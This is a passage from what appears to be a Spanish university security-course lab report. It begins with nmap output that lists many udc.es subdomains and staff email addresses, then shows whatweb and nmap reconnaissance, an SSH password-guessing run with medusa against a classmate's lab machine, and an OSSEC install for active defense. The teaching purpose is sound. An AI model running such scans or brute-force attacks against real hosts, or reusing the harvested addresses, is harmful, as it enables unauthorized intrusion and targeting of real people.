|     inefg.udc.es\nwww.inefg.udc.es
|     eudi.udc.es\nwww.eudi.udc.es
|     educacion.udc.es\nwww.educacion.udc.es
|     dereito.udc.es\nwww.dereito.udc.es
|     paisaxe.udc.es
|     infoguias.biblioteca.udc.es\nwww.infoguias.biblioteca.udc.es
|     vi140.udc.es
|     citic.udc.es\nwww.citic.udc.es
|     *.sic.udc.es\nsic.udc.es
|     *.sai.udc.es\nsai.udc.es
|     ojo.citic.udc.es\nradon.citic.udc.es\ntreboada.citic.udc.es
|     mayores.gtec.udc.es
|     fee.udc.es\nwww.fee.udc.es
|     predestv.udc.es
|     dc.fi.udc.es\nwww.dc.fi.udc.es
|     correcaminos2.udc.es\nwww.correcaminos2.udc.es
|     cartolab2.udc.es
|     nas.gcons.udc.es\nwww.nas.gcons.udc.es
|     gcons.udc.es\nwww.gcons.udc.es
|     forecoop.citic.udc.es
|     vpn.udc.es\nwww.vpn.udc.es
|     vi222.udc.es
|     dotoradociencias.udc.es\nwww.dotoradociencias.udc.es
|     caminos.udc.es\nwww.caminos.udc.es
|     gac.udc.es\nwww.gac.udc.es
|     catedra.handytronic.fic.udc.es\nwww.catedra.handytronic.fic.udc.es
|     destv.udc.es
|     inefg.udc.es\nprobasinefgalicia.udc.es\nwww.inefg.udc.es\nwww.probasinefgalicia.udc.es
|     illa.udc.es
|     servizos.centros.udc.es\nwww.servizos.centros.udc.es
|     adfs.udc.es\nwww.adfs.udc.es
|     gie.udc.es\nwww.gie.udc.es
|     kmelot.biblioteca.udc.es\nwww.kmelot.biblioteca.udc.es
|     dpauc.udc.es
|     vdi.udc.es\nwww.vdi.udc.es
|     aiplus.udc.es\nwww.aiplus.udc.es
|     masterciencias.udc.es\nwww.masterciencias.udc.es
|     videalab.udc.es\nwww.videalab.udc.es
|     vac.udc.es\nwww.vac.udc.es
|     sistemas.sic.udc.es\nwww.sistemas.sic.udc.es
|     sbc-1.udc.es\nwww.sbc-1.udc.es
|     lia2.tic.udc.es\nlia2.udc.es
|     ftp.gadu.udc.es\nwww.ftp.gadu.udc.es
|     autodiscover.udc.es\nwebmail2.udc.es
|     mx2.udc.es\nwww.mx2.udc.es
|     ocingest.udc.es\nwww.ocingest.udc.es
|     ocengage.udc.es\nwww.ocengage.udc.es
|     ocadmin.udc.es\nwww.ocadmin.udc.es
|     live.udc.es\nwww.live.udc.es
|     destv.udc.es\nwww.destv.udc.es
|     authtv.udc.es\nwww.authtv.udc.es
|     sai.udc.es\nwww.sai.udc.es
|     servicash.udc.es\nwww.servicash.udc.es
|     cerbero.tic.udc.es\nwww.cerbero.tic.udc.es
|     data.sai.udc.es\nwww.data.sai.udc.es
|     cas-saml.udc.es\nwww.cas-saml.udc.es
|     economico.udc.es\nwww.economico.udc.es
|     *.xrede.udc.es\nxrede.udc.es
|     tic.udc.es\nwww.tic.udc.es
|     svn.tic.udc.es\nwww.svn.tic.udc.es
|     *.correo.udc.es\ncorreo.udc.es
|     uxxiec.udc.es\nwww.uxxiec.udc.es
|     uxxiecdev.udc.es\nwww.uxxiecdev.udc.es
|     www.xestor.ade.udc.es\nxestor.ade.udc.es
|     neosai.udc.es\nwww.neosai.udc.es
|     www.xescampuswebvm.udc.es\nxescampuswebvm.udc.es
|     matriculawebvm.udc.es\nwww.matriculawebvm.udc.es
|     impresion.eps.udc.es\nwww.impresion.eps.udc.es
|     udcportal.udc.es\nwww.udcportal.udc.es
|     documenta.udc.es\nwww.documenta.udc.es
|     radius.fic.udc.es\nwww.radius.fic.udc.es
|     redmine.tic.udc.es\nwww.redmine.tic.udc.es
|     nac.udc.es\nwww.nac.udc.es
|     *.xescampus.udc.es\nxescampus.udc.es
|     remoto.udc.es\nvpn2.udc.es
|     iacobusplus.udc.es\nwww.iacobusplus.udc.es
|     ANIETO@UDC.ES
|     ELOY.DOMINGUEZ@UDC.ES
|     EVA.MARIA.SOUTOG@UDC.ES
|     videla@udc.es
|     ESTEFANIA.MOURELLE@UDC.ES
|     estefania.mourelle@udc.es
|     VBARRIENTOS@UDC.ES
|     JOSE.ANGEL.JURADO@UDC.ES
|     VICTOR.BARRIENTOS@UDC.ES
|     coro.ffeal@udc.es
|     CORO.FFEAL@UDC.ES
|     ELENA.GSOTO@UDC.ES
|     victor.carneiro@udc.es
|     EGS@UDC.ES
|     SANTIAGO.IGLESIASB@UDC.ES
|     MANUEL.MARTINEZ.CARBALLO@UDC.ES
|     diego.giraldo@udc.es
|     LUISA.SEGADE@UDC.ES
|     MANUEL.PERALBO@UDC.ES
|     RAQUEL.DSEIJAS@UDC.ES
|     ICOLOMINAS@UDC.ES
|     NURIA.FACHAL@UDC.ES
|     JAVIER.DOMINGUEZ@UDC.ES
|     JOSE.CARDONA@UDC.ES
|     GUILLERMO.ALONSO.CARRO@UDC.ES
|     S.MARTINEZ@UDC.ES
|     ALMUDENA@UDC.ES
|     ANXELA.BUGALLO@UDC.ES
|     MARCOS.VIZCAINO@UDC.ES
|     servizos.udc.es
|     academica.udc.es\nautomatricula.udc.es
|     wiki.fic.udc.es
|     webmail.udc.es
|     cas.udc.es
|     admin.fic.udc.es
|     fv.udc.es
|     matricula.udc.es
|     webmail.ucv.udc.es
|     FIDEL.CACHEDA@UDC.ES
|     nas.talionis.udc.es\nwww.nas.talionis.udc.es
|     lia2.tic.udc.es\nwww.lia2.tic.udc.es
|     umi.udc.es
|     lia2.tic.udc.es
|     radon.citic.udc.es
|     iacobusplus.udc.es
|     ojo.citic.udc.es\ntreboada.citic.udc.es
|     vdi.udc.es
|     cicanet.udc.es
|     ceri2014.udc.es\nlpnmr2013.udc.es
|     nauticaemaquinas.udc.es
|     mail.udc.es\nsmtp.udc.es\nwebmail.udc.es\nzimbra.udc.es
|     coruxo.dc.fi.udc.es
|     campus.tic.udc.es
|     autodiscovery.udc.es\nwebmail2.udc.es
|     treboada.citic.udc.es
|     webmail2.udc.es
|     rnasa-imedir.udc.es\nwww.rnsa-imedir.udc.es
|     data.sai.udc.es
|     novas.udc.es\nwww.udc.es
|     servicash.udc.es
|     xestor.ade.udc.es
|     cas-saml.udc.es
|     economico.udc.es
|     svn.tic.udc.es
|     uxxiec.udc.es
|     uxxiecdev.udc.es
|     neosai.udc.es
|     xescampuswebvm.udc.es
|     matriculawebvm.udc.es
|     smtp.udc.es
|     sistemas.sic.udc.es
|     probasinefgalicia.udc.es
|     ocengage.udc.es
|     cursosrcc.regicc.udc.es\nwww.cursosrcc.regicc.udc.es
|     authtv.udc.es
|     live.udc.es
|     redmine.tic.udc.es
|     eps.udc.es
|     mail.udc.es\nsmtp.udc.es\nwebmail.udc.es
|     www.udc.es
|     tv.udc.es
|     *.accedys.udc.es
|     moodle19.udc.es
|     incidencias.fic.udc.es
|     cliente.documenta.udc.es
|     alfresco-dev.udc.es
|     silk.sai.udc.es
|     svn.udc.es
|     cixug.xescampus.udc.es
|     portaleco.udc.es
|     xescampus.udc.es
|     furna.udc.es
|     federico.udc.es
|     aplicacions.sic.udc.es
|     wiki.udc.es
|     assets.udc.es
|     svn.fic.udc.es
|     xop.udc.es
|     rede.udc.es
|     espazos.udc.es
|     *.vdi.udc.es
|     cartografia.udc.es
|     SEDE@UDC.ES
|     xestor.fic.udc.es
|     lportaleco.udc.es
|     www.sai.udc.es
|     cultura.udc.es
|     eleccions.udc.es
|     tenda.udc.es
|     sxe.udc.es
|     guiadocente.udc.es
|     deportes.udc.es
|     moodle.udc.es
|     persoal.udc.es
|     www.fundacion.udc.es
|     bdi2.udc.es
|     xestor.etsa.udc.es
|     gnosis.udc.es
|_    www.tic.udc.es

Nmap done: 1 IP address (1 host up) scanned in 21.70 seconds
```

- ¿Qué gestor de contenidos se utiliza en www.usc.es?

```bash
root@debian:/home/lsi# whatweb www.usc.es
http://www.usc.es [301 Moved Permanently] Apache[2.4.41], Country[UNITED STATES][US], HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)], IP[52.157.220.132], RedirectLocation[https://www.usc.gal/], Title[301 Moved Permanently]
https://www.usc.gal/ [301 Moved Permanently] Apache, Content-Language[gl], Country[UNITED STATES][US], HTML5, HTTPServer[Apache], IP[52.157.220.132], Meta-Refresh-Redirect[https://www.usc.gal/gl], RedirectLocation[https://www.usc.gal/gl], Strict-Transport-Security[max-age=31536000; includeSubDomains; preload], Title[Redirecting to https://www.usc.gal/gl], UncommonHeaders[x-drupal-route-normalizer,x-content-type-options,permissions-policy], X-Frame-Options[SAMEORIGIN], X-UA-Compatible[IE=edge], X-XSS-Protection[1; mode=block]
https://www.usc.gal/gl [200 OK] Apache, Content-Language[gl], Country[UNITED STATES][US], HTML5, HTTPServer[Apache], IP[52.157.220.132], MetaGenerator[Drupal 9 (https://www.drupal.org)], Script[application/json], Strict-Transport-Security[max-age=31536000; includeSubDomains; preload], Title[Inicio | Universidade de Santiago de Compostela], UncommonHeaders[x-content-type-options,permissions-policy,link,x-dns-prefetch-control], X-Frame-Options[SAMEORIGIN], X-UA-Compatible[IE=edge], X-XSS-Protection[1; mode=block]
```

OpenCMS\[10.5.4]

### Apartado P

Trate de sacar un perfil de los principales sistemas que conviven en su red de prácticas, puertos accesibles, fingerprinting, etc.

```bash
root@debian:/home/lsi# nmap -A 10.11.48.1
Starting Nmap 7.80 ( https://nmap.org ) at 2022-11-01 17:08 CET
Nmap scan report for 10.11.48.1
Host is up (0.0020s latency).
All 1000 scanned ports on 10.11.48.1 are filtered
MAC Address: DC:08:56:10:84:B9 (Alcatel-Lucent Enterprise)
Too many fingerprints match this host to give specific OS details
Network Distance: 1 hop

TRACEROUTE
HOP RTT     ADDRESS
1   1.99 ms 10.11.48.1

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 29.60 seconds
```

Output de hacer el scan a toda la red:

```bash
root@debian:/home/lsi# nmap -A 10.11.48.0/23 > nmap_full.txt
```

### Apartado Q

Realice algún ataque de “password guessing” contra su servidor ssh y compruebe que el analizador de logs reporta las correspondientes alarmas.

Diccionario [aquí](https://github.com/danielmiessler/SecLists/tree/master/Passwords/Common-Credentials).

```bash
root@debian:/home/lsi# medusa -h 10.11.49.106 -u lsi -P 10k-most-common.txt -M ssh
Medusa v2.2 [http://www.foofus.net] (C) JoMo-Kun / Foofus Networks <jmk@foofus.net>

ACCOUNT CHECK: [ssh] Host: 10.11.49.106 (1 of 1, 0 complete) User: lsi (1 of 1, 0 complete) Password: password (1 of 10001 complete)
ACCOUNT CHECK: [ssh] Host: 10.11.49.106 (1 of 1, 0 complete) User: lsi (1 of 1, 0 complete) Password: 123456 (2 of 10001 complete)
ACCOUNT CHECK: [ssh] Host: 10.11.49.106 (1 of 1, 0 complete) User: lsi (1 of 1, 0 complete) Password: 12345678 (3 of 10001 complete)
ACCOUNT CHECK: [ssh] Host: 10.11.49.106 (1 of 1, 0 complete) User: lsi (1 of 1, 0 complete) Password: 1234 (4 of 10001 complete)
ACCOUNT CHECK: [ssh] Host: 10.11.49.106 (1 of 1, 0 complete) User: lsi (1 of 1, 0 complete) Password: XXXXXXXXX (5 of 10001 complete)
ACCOUNT FOUND: [ssh] Host: 10.11.49.106 User: lsi Password: XXXXXXXXX [SUCCESS]
```

> Al diccionario le añadí la password real del usuario lsi de mi compañero manualmente en la quinta posición.

### Apartado R

Reportar alarmas está muy bien, pero no estaría mejor un sistema activo, en lugar de uno pasivo. Configure algún sistema activo, por ejemplo OSSEC, y pruebe su funcionamiento ante un “password guessing”.

Instalar [OSSEC](https://www.ossec.net/docs/docs/manual/installation/installation-requirements.html):

```bash
root@debian:/home/lsi# apt -y install  wget git vim unzip make gcc build-essential php php-cli php-common libapache2-mod-php apache2-utils inotify-tools libpcre2-dev zlib1g-dev  libz-dev libssl-dev libevent-dev build-essential libsystemd-dev

root@debian:/home/lsi# wget https://github.com/ossec/ossec-hids/archive/refs/tags/3.7.0.zip

root@debian:/home/lsi# mv 3.7.0.zip  ossec-hids-3.7.0.zip

root@debian:/home/lsi# unzip ossec-hids-3.7.0.zip

root@debian:/home/lsi# cd ossec-hids-3.7.0

root@debian:/home/lsi/ossec-hids-3.7.0# ./install.sh

root@debian:/home/lsi/ossec-hids-3.7.0# /var/ossec/bin/ossec-control start
```

Unban:

```bash
/var/ossec/active-response/bin/host-deny.sh delete - <ip>
/var/ossec/active-response/bin/firewall-drop.sh delete - <ip>
```

Check logs:

```bash
tail /var/ossec/logs/ossec.log
tail /var/ossec/logs/active-responses.log
```

### Apartado S

Supongamos que una máquina ha sido comprometida y disponemos de un fichero con sus mensajes de log. Procese dicho fichero con OSSEC para tratar de localizar evidencias de lo acontecido (“post mortem”). Muestre las alertas detectadas con su grado de criticidad, así como un resumen de las mismas.

[ossec-logtest](https://www.ossec.net/docs/docs/programs/ossec-logtest.html#example-2-using-ossec-for-the-forensic-analysis-of-log-files)

```bash

```
